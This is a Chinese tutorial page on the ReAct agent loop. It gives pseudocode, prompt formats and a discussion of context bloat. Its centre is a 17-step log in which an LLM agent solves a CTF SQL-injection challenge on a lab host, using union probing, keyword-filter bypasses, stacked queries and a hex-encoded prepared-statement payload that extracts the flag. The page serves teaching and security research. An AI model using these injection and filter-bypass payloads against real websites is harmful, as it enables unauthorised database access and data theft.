# ReAct

**ReAct** （Reasoning and Acting）即 “推理与行动” ，是一种让语言模型交替进行 **推理（Reasoning）、行动（Action）和观察（Observation）** 的 Agent 执行范式。该策略由 Yao 等人首次在 2022 年的论文 [《ReACT: Synergizing Reasoning and Acting in Language Models》](https://arxiv.org/abs/2210.03629) 当中提出（于 2023 年发表于 ICLR），其核心思想其实是如下范式的 Agent Loop：

- Reasoning: LLM 进行思考（reasoning），给出决策
- Action: Harness 根据 LLM 的决策，进行相应的动作（action），一般是 tool call
- Observation: 获取到动作执行的结果，加入到上下文当中，供 LLM 进行下一轮决策

用 Python 代码可以简单表示为类似下面的形式：

```python
state = initial_state

while not state.is_finished:
    # Reason
    action = llm.generate_action(state)

    if action.type == "final":
        return action.output

    # Act
    observation = tool.execute(
        name=action.tool_name,
        arguments=action.arguments,
    )

    # Observe / Update State
    state.append({
        "action": action,
        "observation": observation,
    })
```

ReAct 是目前 LLM Agent 中最经典、也最常见的执行范式之一。许多现代 Agent 系统虽然在具体实现上加入了 Planning、Reflection、并行 Tool Calling、State Machine 或多 Agent 等机制，但其底层仍然可以看到类似 Reason → Act → Observe → 再次 Reason 的闭环结构。

ReAct loop 可以认为是一种最朴素的 Agent Loop，同时我们可以发现其运行原理似乎和我们前面的 naive agent loop （推理->行动） _似乎并不存在本质区别_ ，因为事实上，在某种程度上 “ReAct” 这一概念 _更多地是将 AI Agent 的通用行动范式进行了规范化，而不是提出了一种完全全新的 Agent Loop_ 。

某种程度而言，所有不同的 Agent Loop 都可以认为是 ReAct 的不同变种 —— ReAct 提供了一种非常基础且具有代表性的 Agent Loop 抽象，而现代 Agent 往往是在这个抽象之上进一步增加规划、状态管理、并行执行和自我反思等机制。

ReAct 也是现在最为流行的 Agent Loop 实现范式，包括 Codex 在内的几乎所有的 AI Agent 的底层 Loop 实现几乎都遵循这一范式。

## 教程：构建传统的 ReAct Agent Loop

接下来我们来看如何构建一个传统的 ReAct Agent Loop，实际上一个朴素的 ReAct Agent Loop 结构和之前在 [简介](https://ctf-wiki.org/ai/ai-for-security/agent/agent-loop/intro/) 里构建的 Loop 基本上没有什么区别，只不过我们需要将上下文换成 ReAct 风格，即让 AI 显式地输出 Thought 并存放到上下文里，这意味着我们每一轮的上下文都应当是这样的结构：

```
Thought:

Let me first inspect files in the working directory.

Action:

ls /workdir

Observation:

Stdout: attachments README.md
Stderr: (null)
```

因此对于我们之前的示例代码，我们只需要做如下两个改动即可：

1 . 让模型显式输出一段思考过程，即在 System Prompt 里给模型指示的输出结构添加一个字段：

```
Your reply should ALWAYS in the form of JSON, as following:

{
    "thought" : "Your thought on this step",
    "execute" : "Command to execute",
    "flag" : "",
    "done" : false
}
```

2 . 将上下文里的第三条消息（历史的执行信息）更改为如下结构：

```
[Action History]
Step: 1
Thought: Let me first inspect files in the working directory.
Execute: ls /workdir
Return Code: 0
Stdout: attachments README.md
Stderr: (null)

Step: 2
Thought: Let me inspect files under /workdir/attachments.
Execute: ls /workdir/attachments
Return Code: 0
Stdout: app
Stderr: (null)
```

其他的基本可以不需要做变更，完整示例代码参见 [https://gist.github.com/arttnba3/d8f1532621d06e237017cd22d49c51f0](https://gist.github.com/arttnba3/d8f1532621d06e237017cd22d49c51f0).

### 实战：利用 Naive Agent Loop 解决简单的 CTF 题目

这里我们以 `[强网杯 2019]随便注` 这道题目作为我们的自动化测试的例子。测试平台选择 [https://ctf2.dasctf.com/](https://ctf2.dasctf.com/) 。我们首先在平台上启动这道题的靶机，然后将靶机地址作为初始输入给到我们的 Agent Loop，选取 小米 MIMO 官网的 `mimo-v2.5-pro-ultraspeed` 模型（2026 年发布的 [MiMo-V2.5-Pro 模型的 UltraSpeed 体验模式](https://mimo.mi.com/models/zh-CN/mimo-v2.5-pro-ultraspeed) ） 作为我们的基模，得到如下自动化解题过程：

```

------ Step 1 ------

[*] Sending request to LLM...
[*] LLM replied in 2.078120231628418 seconds.
[*] Thought: First, I need to explore the target web server to understand the challenge. I'll start by fetching the main page using curl to see if it's accessible and check for any initial clues.
[*] Executing command: curl -v http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80
Successfully copied 63B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: *   Trying 117.21.200.176:80...
* Connected to b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com (117.21.200.176) port 80 (#0)
> GET / HTTP/1.1
> Host: b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: openresty
< Date: Sun, 23 Aug 2026 00:57:45 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< X-Powered-By: PHP/7.3.10
< Cache-Control: no-cache
< 
<html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
</pre>

</body>

</html>
* Connection #0 to host b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com left intact

--------------------------------
stderr: 
--------------------------------

------ Step 2 ------

[*] Sending request to LLM...
[*] LLM replied in 2.2325124740600586 seconds.
[*] Thought: The challenge is an SQL injection scenario with a GET parameter named 'inject'. The note suggests sqlmap is not the soul, meaning manual exploitation is expected. I'll start by testing for SQL injection vulnerability by sending a single quote to see if there's an error or change in response.
[*] Executing command: curl -v 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=1%27'
Successfully copied 78B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: *   Trying 117.21.200.176:80...
* Connected to b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com (117.21.200.176) port 80 (#0)
> GET /?inject=1%27 HTTP/1.1
> Host: b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: openresty
< Date: Sun, 23 Aug 2026 00:57:48 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< X-Powered-By: PHP/7.3.10
< Cache-Control: no-cache
< 
<html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</pre>

</body>

</html>
* Connection #0 to host b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com left intact

--------------------------------
stderr: 
--------------------------------

------ Step 3 ------

[*] Sending request to LLM...
[*] LLM replied in 2.4054083824157715 seconds.
[*] Thought: The SQL injection vulnerability is confirmed with MariaDB. The error indicates the input is enclosed in single quotes. I need to determine the number of columns for UNION-based injection. I'll start by testing ORDER BY with increasing numbers to find the column count, using comment sequence '-- -' to ignore the rest of the query.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=1%27%20ORDER%20BY%201--%20-'
Successfully copied 101B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
<br></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 4 ------

[*] Sending request to LLM...
[*] LLM replied in 2.052356719970703 seconds.
[*] Thought: The response shows an array with 2 elements (index 0 is '1' and index 1 is 'hahahah'), indicating the query likely returns 2 columns. I should verify this by testing ORDER BY 2 and ORDER BY 3. If ORDER BY 3 fails, I'll know there are exactly 2 columns. Then I can proceed with UNION SELECT to extract data.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=1%27%20ORDER%20BY%202--%20-'
Successfully copied 101B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
<br></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 5 ------

[*] Sending request to LLM...
[*] LLM replied in 3.171114206314087 seconds.
[*] Thought: I need to test ORDER BY 3 to confirm the column count. If it fails, we know there are exactly 2 columns. Then I can use UNION SELECT to extract database information, starting with the database version and name.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=1%27%20ORDER%20BY%203--%20-'
Successfully copied 101B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1054 : Unknown column '3' in 'order clause'</pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 6 ------

[*] Sending request to LLM...
[*] LLM replied in 3.2724411487579346 seconds.
[*] Thought: Confirmed there are 2 columns in the SQL query. Now I need to extract database information using UNION SELECT. I'll use a false condition (inject=0) to ensure the original query returns no rows, then UNION SELECT version() and database() to get the MariaDB version and current database name.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION%20SELECT%20version(),%20database()--%20-'
Successfully copied 127B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
--------------------------------
stderr: 
--------------------------------

------ Step 7 ------

[*] Sending request to LLM...
[*] LLM replied in 3.9898669719696045 seconds.
[*] Thought: The response reveals a WAF with regex filter: select|update|delete|drop|insert|where|\.. This blocks my previous UNION SELECT. I need to bypass it by breaking the keyword with comments, e.g., SEL/**/ECT, so the regex doesn't see the contiguous string. Also dot is blocked, but I'm not using dot for now. I'll test UNION/**/SELECT/**/version(),database()-- -
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION/**/SELECT/**/version(),database()--%20-'
Successfully copied 126B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
--------------------------------
stderr: 
--------------------------------

------ Step 8 ------

[*] Sending request to LLM...
[*] LLM replied in 8.431312322616577 seconds.
[*] Thought: The regex filter blocks the substring 'select' in the inject parameter. I need to break 'select' with comments so that it doesn't appear as a contiguous string. I'll try using UNION/**/S/**/E/**/L/**/E/**/C/**/T to bypass the filter and extract database version and name.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION/**/S/**/E/**/L/**/E/**/C/**/T/**/version(),database()--%20-'
Successfully copied 146B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'S/**/E/**/L/**/E/**/C/**/T/**/version(),database()-- -'' at line 1</pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 9 ------

[*] Sending request to LLM...
[*] LLM replied in 2.6829118728637695 seconds.
[*] Thought: The SQL injection filter blocks 'select' as a substring. I need to break the word 'select' so that the substring doesn't appear contiguously. Using inline comments like SEL/**/ECT might work because the filter checks the input string before SQL parsing. I'll test UNION/**/SEL/**/ECT/**/version(),database() to extract version and database name.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION/**/SEL/**/ECT/**/version(),database()--%20-'
Successfully copied 130B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SEL/**/ECT/**/version(),database()-- -'' at line 1</pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 10 ------

[*] Sending request to LLM...
[*] LLM replied in 6.446291208267212 seconds.
[*] Thought: The filter blocks 'select' as a substring, but using inline comments like SEL/**/ECT should bypass it since it breaks the contiguous string. I'll test with a simple UNION/**/SEL/**/ECT 1,2 to see if it returns the column values, confirming the bypass and injection point.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION/**/SEL/**/ECT%201,2--%20-'
Successfully copied 112B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SEL/**/ECT 1,2-- -'' at line 1</pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 11 ------

[*] Sending request to LLM...
[*] LLM replied in 5.82736873626709 seconds.
[*] Thought: The WAF blocks 'select' as a substring. I need to bypass it by inserting a newline character within the keyword to break the contiguous string. I'll test with 'SEL%0AECT' which after URL decoding becomes 'SEL\nECT', avoiding the filter while still being valid SQL syntax.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27%20UNION%20SEL%0AECT%201,2--%20-'
Successfully copied 110B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SEL
ECT 1,2-- -'' at line 1</pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 12 ------

[*] Sending request to LLM...
[*] LLM replied in 3.0273280143737793 seconds.
[*] Thought: The inline comments and newlines don't bypass the SQL filter for 'SELECT'. The WAF blocks: select|update|delete|drop|insert|where|\. (dot). However, 'SHOW' is not blocked! I can use SHOW DATABASES, SHOW TABLES, SHOW COLUMNS to enumerate the database without using SELECT. Let me try SHOW DATABASES first.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27;SHOW%20DATABASES;--%20-'
Successfully copied 102B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
<hr>array(1) {
  [0]=>
  string(11) "ctftraining"
}
<br>array(1) {
  [0]=>
  string(18) "information_schema"
}
<br>array(1) {
  [0]=>
  string(5) "mysql"
}
<br>array(1) {
  [0]=>
  string(18) "performance_schema"
}
<br>array(1) {
  [0]=>
  string(9) "supersqli"
}
<br>array(1) {
  [0]=>
  string(4) "test"
}
<br><hr></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 13 ------

[*] Sending request to LLM...
[*] LLM replied in 2.8053176403045654 seconds.
[*] Thought: I successfully used SHOW DATABASES to list databases. Now I need to enumerate tables in a database that likely contains the flag. The 'supersqli' database looks interesting. I'll use SHOW TABLES FROM `supersqli` to list its tables. Since the WAF blocks dot, I'll use backticks around the database name.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27;SHOW%20TABLES%20FROM%20`supersqli`;--%20-'
Successfully copied 120B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
<hr>array(1) {
  [0]=>
  string(16) "1919810931114514"
}
<br>array(1) {
  [0]=>
  string(5) "words"
}
<br><hr></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 14 ------

[*] Sending request to LLM...
[*] LLM replied in 2.66524338722229 seconds.
[*] Thought: I successfully enumerated tables in the 'supersqli' database. There's a suspicious table named '1919810931114514' which likely contains the flag. I need to examine its columns. I'll use a multi-statement injection to switch to the 'supersqli' database with USE, then show columns from that table. The WAF blocks dot, but I can use backticks around the database and table names without dot syntax.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27;USE%20`supersqli`;SHOW%20COLUMNS%20FROM%20`1919810931114514`;--%20-'
Successfully copied 146B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
<hr>array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
<br><hr></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 15 ------

[*] Sending request to LLM...
[*] LLM replied in 7.207945346832275 seconds.
[*] Thought: I need to extract the flag from the '1919810931114514' table. Since SELECT is blocked by the WAF, I'll test if obfuscating SELECT with mixed case and inline comments can bypass it. I'll first try a simple SELECT 1 to see if it works.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27;Se/**/LECT%201;--%20-'
Successfully copied 100B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
<hr></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 16 ------

[*] Sending request to LLM...
[*] LLM replied in 7.311371088027954 seconds.
[*] Thought: I've identified the table '1919810931114514' with column 'flag' in the 'supersqli' database. Since SELECT is blocked by the WAF, I'll use a prepared statement with a hex-encoded SELECT query to bypass the filter. This involves setting a variable with the hex string for 'SELECT flag FROM `1919810931114514`' and then preparing and executing it.
[*] Executing command: curl -s 'http://b592b8569c0946b5fa9e0f2c.http-ctf2.dasctf.com:80/?inject=0%27;SET%20@sql%20=%200x53454c45435420666c61672046524f4d20603139313938313039333131313435313460;PREPARE%20stmt%20FROM%20@sql;EXECUTE%20stmt;--%20-'
Successfully copied 219B (transferred 2.05kB) to a3ctf24:/tmp/test_cmd
[+] Command executed, result:
--------------------------------
returncode: 0
--------------------------------
stdout: <html>

<head>
    <meta charset="UTF-8">
    <title>easy_sql</title>
</head>

<body>
<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

<pre>
<hr>array(1) {
  [0]=>
  string(42) "CTF2{cd4a05bf-9ca6-47c7-bc70-a98fbc842a48}"
}
<br><hr></pre>

</body>

</html>

--------------------------------
stderr: 
--------------------------------

------ Step 17 ------

[*] Sending request to LLM...
[*] LLM replied in 2.3470633029937744 seconds.
[*] Flag found: CTF2{cd4a05bf-9ca6-47c7-bc70-a98fbc842a48}


[*] All tasks completed! Total time: 82.61726117134094 seconds.
```

可以看到的是，我们的 ReAct Agent Loop 确乎成功地完成了对目标靶机的攻击，并成功地通过 17 个 Step 获取到了环境中的 flag，虽然我们的 Agent Loop 的整个决策过程或许还是比较傻。

### 讨论：原始 ReAct 上下文构造的优缺点

在最初的 ReAct 论文以及 classic ReAct-style Agent 当中，大家都使用的是类似本文所示的 “Thought-Action-Observation” 三段式的上下文，这种设计非常直观：Thought 负责描述模型当前的推理过程，Action 负责描述模型希望执行的动作，而 Observation 则负责将外部环境反馈重新注入上下文。从 Agent Loop 的角度来看，这实际上就是把模型内部的决策过程显式地序列化成了一条 trajectory：

```
Thought₁ → Action₁ → Observation₁
↓
Thought₂ → Action₂ → Observation₂
↓
Thought₃ → Action₃ → Observation₃
↓
...
```

这种设计最大的优点在于 **可解释性非常强** ，因为我们可以很容易地沿着这一 trajectory 回溯：

- 模型当时知道了什么？
- 模型为什么决定调用这个 Tool？
- Tool 返回了什么？
- 模型是否正确理解了 Observation？
- 错误究竟发生在 Reasoning、Action 还是 Observation 的处理阶段？

对于早期 Agent Research 而言，这一点尤其重要，因为研究人员可以直接观察模型的 reasoning trajectory，从而分析模型究竟是如何完成一个多步任务的。

但是，如果从今天的 Agent Engineering 视角重新审视这种设计，我们也会发现一些非常明显的问题：

#### 问题1： 上下文爆炸

假设一个 Agent 执行了 100 个 Step，每一步平均产生：

```
Thought: 200 tokens
Action:   30 tokens
Observation: 500 tokens
```

那么仅仅保存历史 trajectory，就已经产生了：

```
100 × (200 + 30 + 500) = 73,000 tokens
```

> 而这还没有计算 System Prompt、用户输入以及 Tool Definition。

如果我们继续采用最简单的直接将完整 Step 附加到 Context 中的方式，对于需要执行几十甚至几百个 Tool Call 的长任务而言，随着 Agent 不断执行，Context 会线性增长到一个非常恐怖的规模。

尤其需要注意的一点是 Observation 往往比 Thought 更容易产生大量 Token，例如一个 `cat package.json` 可能只返回几十行内容，但 `grep -R "password" /workspace` 可能直接返回几千行结果， `pytest` 甚至可能产生数万 Token 的日志。如果我们简单地将所有 Observation 都永久保留在 Context 中，那么 Agent 最终很容易陷入所谓的 Context Bloat（上下文膨胀）。

虽然目前不少主流模型已经支持高达百万 Token 的上下文窗口，但是上下文膨胀会导致严重的问题，例如：

- 上下文窗口超限
- 模型注意力飘移
- 回答准确率下降
- 成本与延迟增加

#### 问题2： 上下文污染

Agent 的每一个步骤实际上都是有时效性的，而在 Agent 探索的过程当中并不一定能够立即发现事实，例如某个 Agent 在 Step 5 中错误地认为事实 A 是对的，在 Step 10 时意识到事实 B 才是对的，但是 Context 中依然存在 Step 5 时的事实 A，从而反过来影响模型的当前判断： **模型不仅需要花费精力辨识过去的错误事实，甚至有可能重新被这个错误事实给误导** ，因此历史信息并非越多越好。

#### 解决方案（趋势）：Context Engineering

常见的解决办法包括 摘要（summarization）、滑动窗口（sliding window）、上下文压缩（context compression）、RAG/检索、长期记忆与短期上下文分离、工具结果裁剪 等，我们将会在后续相关章节中进行阐述与解析。
